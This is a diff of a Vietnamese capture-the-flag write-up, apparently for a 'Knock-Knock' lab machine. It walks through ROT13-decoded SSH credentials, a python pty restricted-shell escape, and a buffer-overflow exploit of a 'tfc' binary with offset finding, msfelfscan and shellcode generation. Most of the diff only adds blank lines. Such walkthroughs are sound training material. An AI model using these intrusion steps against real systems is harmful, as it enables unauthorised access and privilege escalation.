@@ -89,9 +89,11 @@ Bây giờ tiến hành scan lại
 ![image](https://hackmd.io/_uploads/SJMIrgy8a.png)
 
 Truy cập trên trình duyệt 
+
 ![image](https://hackmd.io/_uploads/B1_DBeJLp.png)
 
 Xem mã nguồn thấy không có gì đặc biệt chỉ có ảnh knocknock.jpg
+
 ![image](https://hackmd.io/_uploads/SkrFSxy8a.png)
 
 Dùng wfuzz tìm các file bị ẩn nhưng không có gì đặc biệt
@@ -101,10 +103,12 @@ Tải ảnh bên trên về máy
 wget http://192.168.18.143/knockknock.jpg
 
 Dùng strings thấy một thông tin đăng nhập có vẻ được mã hóa 
+
 ![image](https://hackmd.io/_uploads/SyHqHeJIp.png)
 
 Đây là mã caesar với ROT 13 
 Decode bằng Cyberchef 
+
 ![image](https://hackmd.io/_uploads/Syvsre1Ua.png)
 
 Thu được:
@@ -118,6 +122,7 @@ username: Jason
 password: jB9jP2knf
 
 ## Bước 2: Khai thác Buffer Overflow 
+
 ![image](https://hackmd.io/_uploads/H16CrlJ86.png)
 
 Login SSH thành công.
@@ -130,19 +135,22 @@ Do shell hạn chế nên cần gọi shell từ python để bypass
 ![image](https://hackmd.io/_uploads/HkQzLxyL6.png)
 
 python -c "import pty; pty.spawn('/bin/bash')"
+
 ![image](https://hackmd.io/_uploads/HkomIxJUT.png)
 
 Encrypt thử file in.tfc
+
 ![image](https://hackmd.io/_uploads/SkwOUekIT.png)
 
 Có thể thấy khi đảo ngược thứ tự file thì sẽ giải mã được 
 Bây giờ chúng ta hãy thử một file lớn để xem nó có lỗ hổng Tràn bộ đệm hay không.
+
 ![image](https://hackmd.io/_uploads/SyFYIlkLa.png)
 
 Có tồn tại Buffer overflow
 Dùng tool [checksec.sh](https://www.trapkit.de/tools/checksec/) để kiểm tra 
-![image](https://hackmd.io/_uploads/HJThLe18a.png)
 
+![image](https://hackmd.io/_uploads/HJThLe18a.png)
 
 không có bất cứ sự bảo vệ nào 
 Do gdb chưa được cài đặt trên máy mục tiêu nên ta phải tải chương trình tfc xuống Kali của mình để phân tích thêm.
@@ -152,7 +160,6 @@ Hoặc gửi từ máy mục tiêu scp tfc kali@192.168.18.145:tfc
 ![image](https://hackmd.io/_uploads/HJyR8eJIp.png)
 
 
-
 Dùng gdb phân tích
 ![image](https://hackmd.io/_uploads/B1a0Ue18T.png)
 
@@ -160,14 +167,15 @@ Tại sao ở đây là 0x0675c916 mà không phải  là 0x41414141?
 Tiếp theo, cần tìm đâu là độ lệch để chỉ cần thay đổi EIP. Sau khi thử một số độ dài khác nhau và kiểm tra giá trị của địa chỉ trả lại bằng gdb. Cuối cùng đã tìm thấy phần bù để ghi đè lên địa chỉ trả về (4124 byte).
 
 Do 4 'A' luôn bắt đầu bằng cùng một byte 'def0 5bab' trong tệp được mã hóa, Vì vậy, 'def0 5bab' có thể được sử dụng như một mẫu để xác định vị trí dữ liệu được mã hóa trong tệp core.
+
 ![image](https://hackmd.io/_uploads/HkWWwlyL6.png)
 ![image](https://hackmd.io/_uploads/rkmMPg186.png)
 
 
 Tiếp theo, sử dụng msfelfscan để lấy địa chỉ jmp esp.
 msfelfscan -j esp /root/tfc
-![image](https://hackmd.io/_uploads/rJImDxJLp.png)
 
+![image](https://hackmd.io/_uploads/rJImDxJLp.png)
 
 Dùng linux / x86 / exec để tạo shellcode
 ![image](https://hackmd.io/_uploads/BJ4rDlJ8T.png)
